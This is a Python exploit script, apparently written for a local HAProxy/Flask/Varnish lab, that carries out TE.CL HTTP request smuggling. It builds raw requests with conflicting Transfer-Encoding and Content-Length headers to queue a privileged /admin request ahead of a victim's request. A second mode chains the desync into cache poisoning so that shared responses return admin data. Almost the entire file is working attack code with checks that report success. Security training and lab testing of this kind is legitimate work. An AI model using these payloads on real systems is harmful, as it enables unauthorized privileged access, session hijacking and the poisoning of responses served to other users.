#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════╗
║         HTTP REQUEST SMUGGLING — TE.CL Variant                      ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  How TE.CL differs from CL.TE:                                       ║
║                                                                      ║
║   CL.TE → Front-end (HAProxy) uses Content-Length                   ║
║            Back-end  (Flask)  uses Transfer-Encoding                ║
║                                                                      ║
║   TE.CL → Front-end (HAProxy) uses Transfer-Encoding  ← this file  ║
║            Back-end  (Flask)  uses Content-Length                   ║
║                                                                      ║
║  Attack flow:                                                        ║
║  1. Attacker sends request with both TE and CL headers               ║
║  2. HAProxy reads full chunked body (honors TE)                      ║
║  3. Flask only reads CL bytes → leftover bytes stay in TCP buffer   ║
║  4. Next victim request gets smuggled prefix prepended to it         ║
║                                                                      ║
║  Usage:                                                              ║
║    python smuggle_tecl.py           → basic TE.CL smuggle           ║
║    python smuggle_tecl.py cache     → TE.CL + cache poisoning chain ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import socket
import time
import sys
import urllib.request

TARGET_HOST = "haproxy"
TARGET_PORT = 80


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def send_raw(payload: bytes, label: str = "") -> str:
    """Send raw bytes over a fresh TCP socket, return decoded response."""
    print(f"\n{'='*62}")
    print(f"  [>>] {label}")
    print(f"{'='*62}")
    print(payload.decode(errors="replace"))
    print("-"*62)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.settimeout(6)
    s.sendall(payload)

    response = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            response += chunk
    except socket.timeout:
        pass
    s.close()

    decoded = response.decode(errors="replace")
    print(f"  [<<] Response:\n{decoded}")
    return decoded


def print_banner(title: str):
    print("\n" + "▓" * 62)
    print(f"  {title}")
    print("▓" * 62)


def http_get(path: str) -> tuple[str, str]:
    """Simple GET, returns (body, x-cache header)."""
    try:
        url = f"http://{TARGET_HOST}:{TARGET_PORT}{path}"
        with urllib.request.urlopen(url) as r:
            return r.read().decode(), r.headers.get("X-Cache", "N/A")
    except Exception as e:
        return str(e), "ERROR"


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 1 — Basic TE.CL Smuggle → Access /admin
# ─────────────────────────────────────────────────────────────────────────────

def attack_tecl_basic():
    """
    Goal: smuggle a POST /admin request so it gets processed
          when the next legitimate victim request arrives.

    Payload breakdown:
      - Transfer-Encoding: chunked  → HAProxy reads all chunks
      - Content-Length: 4           → Flask reads only 4 bytes
      - Everything after those 4 bytes stays in the TCP buffer
      - Victim's next GET arrives → Flask prepends buffer → sees /admin
    """
    print_banner("TE.CL ATTACK 1 — Smuggle POST /admin")

    print("""
  Concept:
    HAProxy sees:  1 request  (reads chunked body in full)
    Flask sees:    1 request  (reads only Content-Length bytes)
    TCP buffer:    leftover = smuggled /admin request
    Next victim:   their request gets merged with smuggled prefix
    """)

    # The request we want Flask to process as the "next request"
    smuggled_prefix = (
        b"POST /admin HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"X-Admin-Auth: secret-token\r\n"
        b"Content-Length: 10\r\n"
        b"\r\n"
    )

    chunk_hex = hex(len(smuggled_prefix))[2:].upper().encode()

    attack_request = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: 4\r\n"              # Flask stops after 4 bytes
        b"Transfer-Encoding: chunked\r\n"     # HAProxy reads full body
        b"\r\n"
        + chunk_hex + b"\r\n"
        + smuggled_prefix + b"\r\n"
        b"0\r\n"
        b"\r\n"
    )

    print("[Step 1] Sending TE.CL smuggling request...")
    send_raw(attack_request, "TE.CL — inject POST /admin into TCP buffer")

    print("[Step 2] Waiting 500ms, then sending victim request...")
    time.sleep(0.5)

    victim_request = (
        b"GET /api/user HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Cookie: session=victim_token_xyz\r\n"
        b"\r\n"
    )
    resp = send_raw(victim_request, "Victim — GET /api/user")

    print("\n" + "─" * 62)
    if "admin" in resp.lower() or "secret" in resp.lower():
        print("  [✓] ATTACK SUCCESSFUL — victim received admin-level response!")
    elif "400" in resp:
        print("  [✗] Blocked — backend rejected ambiguous framing (defenses active).")
    else:
        print("  [~] Inconclusive. TE.CL is timing-sensitive — try running again.")
    print("─" * 62)


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK 2 — TE.CL + Cache Poisoning Chain
# ─────────────────────────────────────────────────────────────────────────────

def attack_tecl_cache():
    """
    Goal: use TE.CL desync to smuggle a privileged GET /api/user
          that Varnish caches under the shared /api/user key.
          Every subsequent user then gets role:admin from cache.

    Steps:
      STEP 1 — Verify cache is clean (role: standard, CACHE MISS)
      STEP 2 — Send TE.CL smuggle with embedded GET /api/user + X-Admin-Auth
      STEP 3 — Trigger: GET /api/user activates the queued request
      STEP 4 — Verify: multiple GET /api/user all return role:admin (CACHE HIT)
    """
    print_banner("TE.CL ATTACK 2 — TE.CL + Cache Poisoning Chain")

    # STEP 1
    print("\n[STEP 1] Verifying cache is clean before attack...")
    body, cache = http_get("/api/user")
    print(f"  X-Cache : {cache}")
    print(f"  Body    : {body[:120]}")
    if "standard" in body.lower():
        print("  [✓] Cache clean — role: standard confirmed.")
    else:
        print("  [!] Unexpected response — cache may already be dirty.")

    # STEP 2
    print("\n[STEP 2] Sending TE.CL smuggle (embedded privileged GET /api/user)...")

    smuggled = (
        b"GET /api/user HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"X-Admin-Auth: secret-token\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n"
    )
    chunk_hex = hex(len(smuggled))[2:].upper().encode()

    smuggle_request = (
        b"POST / HTTP/1.1\r\n"
        b"Host: localhost\r\n"
        b"Content-Length: 4\r\n"
        b"Transfer-Encoding: chunked\r\n"
        b"\r\n"
        + chunk_hex + b"\r\n"
        + smuggled + b"\r\n"
        b"0\r\n"
        b"\r\n"
    )
    resp2 = send_raw(smuggle_request, "TE.CL — smuggle GET /api/user with X-Admin-Auth")

    if "400" in resp2:
        print("\n  [✗] Blocked at STEP 2 — defenses are active.")
        print("  [!] Run with vulnerable configs to see the attack succeed.")
        return

    # STEP 3
    print("\n[STEP 3] Sending trigger GET /api/user to activate queued request...")
    time.sleep(0.5)
    resp3 = send_raw(
        b"GET /api/user HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "Trigger — GET /api/user"
    )

    # STEP 4
    print("\n[STEP 4] Verifying cache poisoning — sending 4 normal requests...")
    time.sleep(0.3)

    poisoned = 0
    for i in range(4):
        body, cache = http_get("/api/user")
        status = "POISONED ✗" if ("admin" in body.lower() or "secret_key" in body.lower()) else "clean ✓"
        print(f"  Request {i+1}: X-Cache={cache:<8} | {status} | {body[:60]}")
        if "POISONED" in status:
            poisoned += 1
        time.sleep(0.2)

    print("\n" + "─" * 62)
    if poisoned > 0:
        print(f"  [✓] CACHE POISONED! {poisoned}/4 requests returned admin data.")
        print("  [!] Run purge_cache.py to clean up.")
    else:
        print("  [~] Cache not poisoned this run — timing-sensitive, try again.")
    print("─" * 62)


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print(__doc__)

    if len(sys.argv) > 1 and sys.argv[1] == "cache":
        attack_tecl_cache()
    else:
        attack_tecl_basic()